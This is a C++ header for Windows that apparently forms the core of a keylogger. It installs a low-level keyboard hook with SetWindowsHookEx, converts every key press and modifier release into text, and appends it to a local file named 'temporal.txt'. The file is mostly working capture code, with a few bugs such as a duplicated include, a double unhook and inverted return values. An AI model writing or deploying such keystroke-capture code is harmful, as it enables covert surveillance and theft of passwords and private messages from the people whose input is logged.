#ifndef H_KEY_HOOK
#define H_KEY_HOOK

#include <iostream>
#include <sstream>
#include <Windows.h>
#include <string>
#include <fstream>
#include <stdlib.h>
#include "KeyConstants.h"
#include "KeyConstants.h"

using namespace std;

HHOOK keyboardHook;

std::string keylog="";


//get key press with method toUnicodeEx
std::string GetKeyName(tagKBDLLHOOKSTRUCT* t)
{
	try {
		unsigned char btKeys[256] = { 0 };
		if (!GetKeyboardState(btKeys)) {
			printf("Error: %ld\n", GetLastError());
		}

		HKL keyboardLayout = GetKeyboardLayout(0);

		wchar_t szBuffer[255] = { 0 };
		if (ToUnicodeEx(t->vkCode, t->scanCode, btKeys, szBuffer, 2, 0, keyboardLayout)) {
			cout << szBuffer << endl;
			wstring ws(szBuffer);
			string str(ws.begin(), ws.end());
			return str;
		}
	}
	catch (int result) {
		printf("result error %d", result);
	}
	return "ERROR";
}



string DwordToString(DWORD d) {
std:ostringstream stream;
	stream << d;
	return stream.str();
};


// Method for add in file the text added for the user
void addText(string texto) {
	try {

		ofstream file;
		file.open("temporal.txt", ofstream::out | ofstream::app);
		file << texto;
		file.close();
	}
	catch (int i) {
		printf("Se generó un error escribiendo el archivo %d", i);
	}
};



LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	KBDLLHOOKSTRUCT* key2 = (KBDLLHOOKSTRUCT*)lParam;
	//a key was pressed
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
	{
		//std::cout << "KEY" << GetKeyName(key) << std::endl;
		keylog +=  Keys::KEYS[key2->vkCode].Name;
	}

	// a key was released
	if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {


		DWORD keyPress = key->vkCode;
		if (keyPress == VK_CONTROL
			|| keyPress == VK_LCONTROL
			|| keyPress == VK_RCONTROL
			|| keyPress == VK_SHIFT
			|| keyPress == VK_RSHIFT
			|| keyPress == VK_LSHIFT
			|| keyPress == VK_MENU
			|| keyPress == VK_LMENU
			|| keyPress == VK_RMENU
			|| keyPress == VK_CAPITAL
			|| keyPress == VK_NUMLOCK
			|| keyPress == VK_LWIN
			|| keyPress == VK_RWIN
			) {
				std::string KeyName = Keys::KEYS[key->vkCode].Name;
				KeyName.insert(1, "/");
				keylog += KeyName;
			}
	}

	addText(keylog);
	keylog = "";
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
};



bool installHook() {
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
	return keyboardHook == NULL;
};



bool unistallHook() {
	UnhookWindowsHookEx(keyboardHook);
	BOOL b = UnhookWindowsHookEx(keyboardHook);
	keyboardHook = NULL;
	return (bool)b;
}


bool isHooked() {
	return (bool)(keyboardHook == NULL);
}



#endif 